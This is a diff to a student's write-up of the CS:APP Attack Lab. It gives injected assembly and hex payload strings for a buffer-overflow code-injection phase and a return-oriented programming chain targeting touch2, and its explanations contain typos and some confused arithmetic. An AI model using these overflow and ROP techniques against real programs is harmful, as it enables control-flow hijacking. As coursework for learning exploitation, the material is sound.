@@ -140,15 +140,56 @@ into the stack.
 In the attack 3, it use the function hexmatch, so the stack will be changed. 
 If you storage the data of the cookie in the stack place allcated by the getbuf
 will be changed, so we need to palce the cookie into the older place. 
-
-```c
-ff 34 25 fa 18 40 00 48 
-c7 c7 a8 1d 56 05 c3 00  <<== top of the stack (0x5561dc78)
-00 00 00 00 00 00 00 00 
-00 00 00 00 00 00 00 00 
-00 00 00 00 00 00 00 00 
-78 dc 61 55 00 00 00 00 <<== ret 
-35 39 62 39 39 37 66 61 <<== cookie (0x5561dc78 + 30 = 0x5561da8)  
+The hack code should be like this.
+```nasm
+pushq $0x4018fa
+movq $0x5561dca8,%rdi
+ret
 ```
+After objdump it. we can get its machine instructions. 
+```c
+68 fa 18 40 00 48 c7 c7
+a8 dc 61 55 c3 00 00 00 <<== machine code 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00 <<== The top of the stack 
+35 39 62 39 39 37 66 61 <<== The string 
+```
+
+# The attack 4
+
+For the attack 4, it is different from the previous attacks, you can not use the 
+code injection directly in the phase2 because
+- the stack is random. You won't know where your code is put. 
+- The code in the stack is unexecuteable, you can only jump to a certain code. 
+
+So you will need to using the command and the reg to achieve it. 
+
+So the command we need will be the 
+```nasm
+push cookie (1)
+popq %rax   (2)
+movq %rax, %rdi (3)
+```
+The cookie should be put in the old place than the (2)
+Then we should make the (3) and the address of the `touch2` at the older place of 
+the stack. 
+
+```nasm
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+cc 19 40 00 00 00 00 00 <<== (1)
+fa 97 b9 59 00 00 00 00 <<== cookie
+c5 19 40 00 00 00 00 00 <<== (3)
+ec 17 40 00 00 00 00 00 <<== address of the touch2 
+```
+
+# The attack 5
+
+
 
 
